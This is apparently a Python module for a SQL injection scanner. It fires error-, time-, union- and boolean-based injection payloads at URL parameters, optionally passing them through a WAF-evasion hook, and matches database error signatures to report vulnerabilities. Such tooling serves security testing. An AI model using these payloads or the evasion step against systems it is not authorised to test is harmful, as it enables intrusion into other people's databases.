"""
SQLi Scanner - Advanced SQL Injection Detection
Error-based, Union-based, Time-based, Boolean-based
"""
import asyncio
import time
import re
from typing import Dict, List, Optional, Tuple

class SQLiScanner:
    def __init__(self, engine, waf_evasion=None):
        self.engine = engine
        self.waf = waf_evasion
        
        self.error_signatures = {
            "mysql": [
                "you have an error in your sql syntax",
                "warning: mysql",
                "mysql_fetch",
                "mysqli_",
                "unclosed quotation mark",
            ],
            "postgresql": [
                "postgresql query failed",
                "pg_query",
                "pg_exec",
            ],
            "mssql": [
                "microsoft sql server",
                "odbc sql server driver",
                "sql server error",
            ],
            "oracle": [
                "ora-",
                "oracle error",
                "oracle driver",
            ],
            "sqlite": [
                "sqlite_query",
                "sqlite3::",
                "unrecognized token",
            ]
        }
        
        self.payloads = {
            "error_based": [
                "'", "\"", "' OR '1'='1", "1' AND 1=1--", "1' AND 1=2--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "\" OR \"1\"=\"1", "' OR 1=1#", "1\" AND 1=1--",
            ],
            "time_based": [
                "1 AND SLEEP(5)",
                "1' AND SLEEP(5)--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
                "1; WAITFOR DELAY '0:0:5'--",
                "1 AND pg_sleep(5)",
            ],
            "union_based": [
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--",
            ],
            "boolean_based": [
                "' AND 1=1--", "' AND 1=2--",
                "\" AND 1=1--", "\" AND 1=2--",
            ]
        }
    
    async def scan(self, url: str, param: str) -> List[Dict]:
        """Comprehensive SQLi scan"""
        findings = []
        
        # 1. Error-based
        error_result = await self._test_error_based(url, param)
        if error_result:
            findings.append(error_result)
        
        # 2. Time-based (Blind)
        time_result = await self._test_time_based(url, param)
        if time_result:
            findings.append(time_result)
        
        # 3. Boolean-based (Blind)
        bool_result = await self._test_boolean_based(url, param)
        if bool_result:
            findings.append(bool_result)
        
        return findings
    
    async def _test_error_based(self, url: str, param: str) -> Optional[Dict]:
        """Test Error-based SQLi"""
        for payload in self.payloads["error_based"]:
            test_payload = self.waf.evade_payload(payload, "sql") if self.waf else payload
            test_url = self._inject_param(url, param, test_payload)
            
            result = await self.engine.request("GET", test_url)
            
            db_type, signature = self._detect_sql_error(result.body)
            if db_type:
                return {
                    "type": "SQL_INJECTION_ERROR",
                    "subtype": "Error-based",
                    "url": url,
                    "parameter": param,
                    "payload": test_payload,
                    "database": db_type,
                    "error_signature": signature,
                    "severity": "CRITICAL"
                }
        return None
    
    async def _test_time_based(self, url: str, param: str) -> Optional[Dict]:
        """Test Time-based Blind SQLi"""
        for payload in self.payloads["time_based"]:
            test_payload = self.waf.evade_payload(payload, "sql") if self.waf else payload
            test_url = self._inject_param(url, param, test_payload)
            
            start = time.time()
            result = await self.engine.request("GET", test_url)
            elapsed = time.time() - start
            
            if elapsed > 4.5:  # SLEEP(5) - tolerance
                return {
                    "type": "SQL_INJECTION_BLIND",
                    "subtype": "Time-based",
                    "url": url,
                    "parameter": param,
                    "payload": test_payload,
                    "response_time": elapsed,
                    "severity": "CRITICAL"
                }
        return None
    
    async def _test_boolean_based(self, url: str, param: str) -> Optional[Dict]:
        """Test Boolean-based Blind SQLi"""
        # Compare AND 1=1 with AND 1=2
        true_payload = self.waf.evade_payload("1' AND 1=1--", "sql") if self.waf else "1' AND 1=1--"
        false_payload = self.waf.evade_payload("1' AND 1=2--", "sql") if self.waf else "1' AND 1=2--"
        
        true_url = self._inject_param(url, param, true_payload)
        false_url = self._inject_param(url, param, false_payload)
        
        true_result = await self.engine.request("GET", true_url)
        false_result = await self.engine.request("GET", false_url)
        
        # If significant content difference
        if abs(len(true_result.body) - len(false_result.body)) > 50:
            return {
                "type": "SQL_INJECTION_BLIND",
                "subtype": "Boolean-based",
                "url": url,
                "parameter": param,
                "payload": true_payload,
                "true_length": len(true_result.body),
                "false_length": len(false_result.body),
                "severity": "CRITICAL"
            }
        return None
    
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject value into parameter"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
    
    def _detect_sql_error(self, body: str) -> Tuple[Optional[str], str]:
        """Detect SQL errors"""
        if not body:
            return None, ""
        
        body_lower = body.lower()
        
        for db_type, signatures in self.error_signatures.items():
            for sig in signatures:
                if sig in body_lower:
                    return db_type, sig
        
        return None, ""